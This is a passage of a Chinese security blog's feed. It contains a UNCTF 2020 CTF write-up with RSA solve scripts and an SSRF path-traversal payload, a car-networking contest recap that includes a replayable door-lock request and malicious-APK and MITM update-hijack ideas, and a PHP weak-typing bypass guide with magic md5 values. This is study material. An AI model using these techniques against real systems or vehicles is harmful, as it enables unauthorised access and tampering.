class="comment">#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br></pre></td></tr></table></figure><p>a，b已知，通过加减乘除即可知 p，q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/07 23:56:39</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line"></span><br><span class="line">a = <span class="number">320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line">b = <span class="number">9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line">c = <span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line"></span><br><span class="line">q = (a-b)//<span class="number">2</span></span><br><span class="line">p = a - q</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># UNCTF&#123;welcome_to_rsa&#125;</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，如果是 <code>q = (a-b)/2</code> ，会抛出 <code>OverflowError: int too large to convert to float</code>。这里是因为在 Python3 里面，<code>/</code> 默认是浮点数除法，q 默认类型即为 <code>float</code> ，浮点数对于大数会出现掉精度的问题，导致相减时范围溢出。</p><p>解决方法是换用整数除法 <code>\\</code>，整数除法在 Python3 里面是结果向下取整，如下，但重要的是做大数除法的时候会保留 int 类型的精度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span>/<span class="number">2</span></span><br><span class="line"><span class="number">4.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span>//<span class="number">2</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h3><p>winner attack 获取到 d 的值，然后解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@time:2020/11/09 17:18:05</span></span><br><span class="line"><span class="string">@author:Str3am</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span></span><br><span class="line">d= <span class="number">74651354506339782898861455541319178061583554604980363549301373281141419821253</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</span></span><br></pre></td></tr></table></figure><p>培根密码，o换成a，t换成b，然后解密即可，<code>unctf{PEIGENHENYOUYINGYANG}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h3><p><img src="/2020/11/19/Web_17/20201111140507.png" alt="image-20201111140459406"></p><p>初入逆向，工具都是现学，x64dbg 动态调即得 flag</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>参照这篇文章，反编译 run.py</p><p><a href="http://pluie.top/2020/09/03/pyinstaller%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E5%8F%8D%E6%B1%87%E7%BC%96%E6%88%90-py%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">http://pluie.top/2020/09/03/pyinstaller%E6%89%93%E5%8C%85%E7%9A%84-exe%E6%96%87%E4%BB%B6%E5%8F%8D%E6%B1%87%E7%BC%96%E6%88%90-py%E6%96%87%E4%BB%B6/</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">'UMAQBvogWLDTWgX"""k'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    flag += chr(ord(str2[i]) + i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(flag)</span></span></span><br></pre></td></tr></table></figure><p><code>UNCTF{un_UN_ctf123}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;easy-ssrf&quot;&gt;&lt;a href=&quot;#easy-ssrf&quot; class=&quot;headerlink&quot; title=&quot;easy_ssrf&quot;&gt;&lt;/a&gt;easy_ssrf&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;welc0me to 2020UNCTF!!&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$url = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/unctf\.com/&#39;&lt;/span&gt;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/php|file|zip|bzip|zlib|base|data/i&#39;&lt;/span&gt;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $url=file_get_contents($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;($url);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;error!!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;url里只要包含 &lt;code&gt;unctf.com&lt;/code&gt; 即可，开始想多了，弄到 gopher 协议了，然后发现 &lt;code&gt;dict&lt;/code&gt; 和 &lt;code&gt;gopher&lt;/code&gt; 协议根本没开启，手慢错失三血&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt;e035ba36-&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;bf8-&lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;c8-&lt;span class=&quot;number&quot;&gt;9837&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;afecc32ca08.node3.hackingfor.fun&lt;span class=&quot;regexp&quot;&gt;/?url=/u&lt;/span&gt;nctf.com&lt;span class=&quot;regexp&quot;&gt;/../&lt;/span&gt;..&lt;span class=&quot;regexp&quot;&gt;/../&lt;/span&gt;..&lt;span class=&quot;regexp&quot;&gt;/flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 原型链污染</title>
    <link href="https://jlkl.github.io/2020/11/06/Web_16/"/>
    <id>https://jlkl.github.io/2020/11/06/Web_16/</id>
    <published>2020-11-05T16:30:16.000Z</published>
    <updated>2020-11-15T01:54:38.537Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cb8bada7d67f0dea51de1824fd7ec7ec66379822b32cbe83bc37354fbba2f6fa"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      此文章已被加密，需要输入密码访问。
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Node.js" scheme="https://jlkl.github.io/tags/Node-js/"/>
    
      <category term="JavaScript" scheme="https://jlkl.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>某车联网安全挑战赛总结</title>
    <link href="https://jlkl.github.io/2020/10/22/Other-02/"/>
    <id>https://jlkl.github.io/2020/10/22/Other-02/</id>
    <published>2020-10-22T06:19:50.000Z</published>
    <updated>2020-10-22T06:21:17.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、第一天"><a href="#一、第一天" class="headerlink" title="一、第一天"></a>一、第一天</h2><p><strong>上午</strong></p><p>CTF 夺旗，考验基础渗透能力，有些简单的题目 sqlmap 可以直接出，主要是 Web 和 Misc 方向的题目，一个半小时20多道题目，时间有点紧。没有提供网线，WiFi 连接内网，切换热点查资料不是很方便。</p><a id="more"></a><p><strong>下午</strong></p><p>汽车交互系统 App 漏洞挖掘，还有一个云平台，主要考验安卓逆向能力，不是想象中的给一个 apk 然后自己找漏洞，会提供一些填空题，问答题要求让你做。大概题目有，Apk包名是什么，使用的中间件名字版本，最主要的还是车身控制比如开关车门、空调预约指令的重放，大概看了一下数据先使用 AES 再使用 Base64 加密。</p><p><strong>关门指令数据包</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /eop/IAPPService/saveLockState?mobileNum=ixrlg%<span class="number">2</span>B4yOqNGFhorPPUJRQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;token=<span class="number">0</span>%<span class="number">2</span>Fah6b%<span class="number">2</span>BJbUT5D5fDHcltV29caZViC05pvC3tKf605tc%<span class="number">3</span>D&amp;door=<span class="number">3</span>I4228ovBIPLv2Q6yyyE9Q%<span class="number">3</span>D%<span class="number">3</span>D&amp;state=KNYz3Sd6UE9gJ%<span class="number">2</span>BXCNCTVAQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;deviceId=<span class="number">21e0</span>b51be0a0d2a75E%<span class="number">3</span>A2A%<span class="number">3</span>A86%<span class="number">3</span>A23%<span class="number">3</span>A80%<span class="number">3</span>A0C HTTP/<span class="number">1.1</span></span><br><span class="line">Charset: UTF<span class="number">-8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">timestamp: <span class="number">1603179934743</span></span><br><span class="line">sign: B4E15BFC376DB0640D8159CCF223FD71</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.101</span><span class="number">.34</span>:<span class="number">8080</span></span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=<span class="number">37716403183</span>F1A23B36555FEDF7C0AA2</span><br><span class="line">User-Agent: okhttp/<span class="number">3.12</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="二、第二天"><a href="#二、第二天" class="headerlink" title="二、第二天"></a>二、第二天</h2><p><strong>上午</strong></p><p>每个队伍一个小时进车，连接OBD获取车CAN指令信息，抓取每个控制CAN控制指令比如开关车窗发送的数据。这一块其实感觉和车联网关系不大，是车辆的控制和协议了，类似 Burp 抓包的过程，总共 75 项数据，执行每个指令后有些数据会变化，还有一些事周期性变化的数据，需要从这里面找出对应指令的数据。这块建议多摸真车实践操作。</p><p><strong>下午</strong></p><p>车辆娱乐系统漏洞挖掘，这块就比较开放，随意查找漏洞，安卓9.0系统。之前用中间人攻击抓取了部分流量分析，发现外网的请求就只有酷我音乐还有高德地图。这里我们有两个攻击的思路：</p><ol><li>拨号开启 adb 调试模式，然后安卓恶意 apk 程序本地代码执行，这里需要注意的是系统默认有一个守护进程会禁止安装 apk，需要通过 adb 获取 root 权限然后 kill 掉守护进程才能正常安装。</li><li>中间人攻击，劫持域名解析结果到本地，结合应用检查更新的功能，替换成恶意apk程序安装，但这里需要 http 协议通信的才可以成功。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>类似的比赛，夺旗赛可以先派 CTF 选手上，涉及车联网方面再让车联网大哥上。这次成绩不理想，没有其他的原因，菜是原罪，好好努力吧</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、第一天&quot;&gt;&lt;a href=&quot;#一、第一天&quot; class=&quot;headerlink&quot; title=&quot;一、第一天&quot;&gt;&lt;/a&gt;一、第一天&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;上午&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CTF 夺旗，考验基础渗透能力，有些简单的题目 sqlmap 可以直接出，主要是 Web 和 Misc 方向的题目，一个半小时20多道题目，时间有点紧。没有提供网线，WiFi 连接内网，切换热点查资料不是很方便。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP函数漏洞总结</title>
    <link href="https://jlkl.github.io/2020/08/26/PHP_01/"/>
    <id>https://jlkl.github.io/2020/08/26/PHP_01/</id>
    <published>2020-08-26T12:47:35.000Z</published>
    <updated>2020-08-26T12:53:09.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要针对 PHP 函数相关的漏洞的总结，可能会偏向 CTF 方面，内容肯定不全，有空的话会持续更新，欢迎各位表哥补充以及对文章错误之处进行斧正！</p><a id="more"></a><h2 id="1-弱类型安全问题"><a href="#1-弱类型安全问题" class="headerlink" title="1 弱类型安全问题"></a>1 弱类型安全问题</h2><h3 id="1-1-弱类型比较缺陷"><a href="#1-1-弱类型比较缺陷" class="headerlink" title="1.1 == 弱类型比较缺陷"></a>1.1 == 弱类型比较缺陷</h3><p><code>===</code> 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>（1）字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值则为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>== <span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>（2）在进行弱类型比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e99999"</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>（3）当字符串当作数值来取值时，如果字符串中包含<code>.</code>、<code>e</code>、<code>E</code>或者数值超过整型范围内时，被当作float来取值，如果没有包含上述字符且在整形范围内，则该字符串会当作 int 来取值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="number">1</span> + <span class="string">"10.5"</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"-1.3e3"</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"bob-1.3e3"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"2admin"</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"admin2"</span>;<span class="comment">//$test=1(int)</span></span><br></pre></td></tr></table></figure><p>（4）<code>ture</code> 和任意字符串弱类型相等，和非 0 数字若类型相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">"admin"</span>== <span class="keyword">true</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0admin"</span>== <span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">7</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">1</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(<span class="number">0</span>==<span class="keyword">true</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="number">-7</span>==<span class="keyword">true</span>);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>附上类型比较表：</p><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/types.comparisons.php</a></p><h3 id="1-2-switch"><a href="#1-2-switch" class="headerlink" title="1.2 switch()"></a>1.2 switch()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'flag&#123;xxxxxx&#125;'</span>;  <span class="comment">//结果输出flag</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用php弱类型原理，<code>$a=&quot;4admin&quot;</code>在进行弱类型比较时会截取前面的4作为字符串的数值，正好可以匹配到<code>case 4</code></p><h3 id="1-3-md5"><a href="#1-3-md5" class="headerlink" title="1.3 md5()"></a>1.3 md5()</h3><ol><li>hash 比较缺陷</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">      $logined = <span class="keyword">true</span>;</span><br><span class="line">      $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">      $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">       <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>弱比较，hash 值为 0e 开头即可绕过，例如 <code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code></p><p>附上常见 0e 开头的md5和原值：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span> </span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span 